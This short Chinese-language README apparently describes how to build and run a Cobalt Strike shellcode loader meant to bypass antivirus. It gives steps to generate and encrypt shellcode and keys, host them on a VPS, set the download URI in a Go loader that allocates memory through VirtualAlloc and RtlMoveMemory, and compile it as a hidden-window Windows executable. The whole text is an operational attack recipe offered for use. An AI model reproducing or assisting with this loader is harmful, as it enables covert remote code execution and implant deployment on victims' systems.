1. CS加载Bypass_make.cna插件，生成shellcode和加密key1、key2：
"Attack" > "BypassShellCode"

2. 将得到的shellcode和key的值分别做加密：
process_shellcode.exe shellcode > code.txt
process_shellcode.exe key1 > k1.txt
process_shellcode.exe key2 > k2.txt

3. 得到的三个结果分别手动保存为文件放在vps上
code.txt
k1.txt
k2.txt

4. 修改shellcode_loader.go中的vps请求地址即可：
```
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlMoveMemory")
	URI           = "http://vps:80/"
)
```

6. 编译go文件：
go build -ldflags "-H windowsgui" shellcode_loader.go

7. 运行shellcode_loader.exe即可
